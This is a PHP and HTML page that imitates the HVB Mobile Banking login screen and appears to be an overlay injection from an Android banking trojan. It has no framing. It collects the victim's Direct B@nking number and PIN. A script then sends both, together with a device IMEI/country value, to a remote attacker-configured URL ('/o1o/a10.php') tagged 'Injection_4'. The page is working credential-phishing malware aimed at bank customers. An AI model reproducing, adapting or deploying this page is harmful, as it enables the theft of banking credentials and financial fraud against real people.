<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="de/eu.unicreditgroup.hvbapptan/style.css">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACsAAAAYCAIAAADs0ZOUAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QjJEODExNDQ5NzM2MTFFOEFDRDlCNDdBMTNGNjUxRkEiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QjJEODExNDU5NzM2MTFFOEFDRDlCNDdBMTNGNjUxRkEiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpCMkQ4MTE0Mjk3MzYxMUU4QUNEOUI0N0ExM0Y2NTFGQSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpCMkQ4MTE0Mzk3MzYxMUU4QUNEOUI0N0ExM0Y2NTFGQSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PkgfNNoAAAMLSURBVHjaYvz//z/DgAIWWhj6//OX37fu/X3xGshm5GBnlpZgUVFkZGGmhwt+X7/9qXv6twUrGVBDlklMRKC3nsvfnZGXG00LI7Vi4f+Pnx+b+j63T8EuzcrCyMrKJC0pun0xq7IC9V3w//fvN34JP3YcQApcFsHZXRxeTsxCgows2EL6718GZlC8MD6VMiTeJlYDbdGtizHF34RnfF+1GcVnXJzSry4xcnPhMupTz3S+kkyQU/8+e0m8C4BpClPw6+I131dvQQ+Vb9+f8KpxeLuIbl6AqeX71j3flq6HukDmx30SgpuREVPsY0MfA9aoZGQUmtGBKfxlzrL36eV8RWkwx1IGvm/f94hBCiv6Mn8lpvqPrZMeMUoDZZ8pW0FEKM2NX2YvwyrOZmnMnRCGJvi+oP7LxDkQ9p8Hj/9/+cbIw8Xy/+s3fKHOxYk15OHgz90HWJKLhKj4oXVogm8js76t2IicF34cOMrp48ryhEcVjwVSz88zS4jhy4cYHgDmPZFNCxiQc+Dff688o3/uPoRefN1+wAlMiTx5SQTCgETAk5vIZmoA5/57//Glufef21jTOyj9sghObKYkHTDy8qAUGNrqAn0NCF9evv7Syv//l6/YSxdNUPAzUZgS2Yx1kQNMeO1sRKbfc+iFoRsu64HlNIejFRVcwJ0YwcAETaq8Fdms6sqQVPZl0eo3rpHAFICzeFVWYGRnB8XC/5+/SCqRGNlYkQXYrUxY9bV/n7/CZmvGX1sIitvvP96Epv3YupdQcoGmP0Zg4UBCmJvqi5/ahib4c8/h196xko/PMIuJ/Hvz7pm8GbBIJtAq0VaTvLIfymaWEifeBUyiwpiC7C62Us8vMAkJ/Nix/7V3HMO/f4RaRcyiG+dTv33wLrHo68JVDARNY2EW27+G3cYM4SvqWJ9dxSgiKDS/D54qcWQ/Fcmbh5Gtp14YAA0BF97Auv7L/BWfO6f+//wVrWHB31TC4WoPbDbSqpWG1v75fecBsDRk+PGTkZODWV6aWVyMAUfoMA54ax0gwAAQfHcBU7lwogAAAABJRU5ErkJggg==">
    </div>

    <h3> HVB Mobile B@nking </h3>
    <form action="null" class="form" class="form" method="post" id="_mainForm" target="flow_handler">
        <div class="field11">
            <input tpye="text" class="field" name="login" id="login" placeholder="Direct B@nking Nummer">
            <hr>
            <input type="password" class="field" name="password" id="password" placeholder="PIN">
        </div>

        <input type="submit" class="button" id="sbt_button" value="ANMELDEN">
    </form>

    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('sbt_button');
        g_oBtn.onclick = function () {
        
            var oNumInp = document.getElementById('login');
            var oCodeInp = document.getElementById('password');

            try{
                oNumInp.className = 'field';
                oCodeInp.className = 'field';
            } catch(e){};
            
            if (!/^\w{3,50}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'field error';
                } catch(e){};
                return false;
            }
            
            if (!/^\w{3,50}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'field error';
                } catch(e){};
                return false;
            }

			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|de_unicreditgroup|"+oNumInp.value+"|"+oCodeInp.value);
           
           return false;
       };
       
   })();
</script>
</body>
</html>
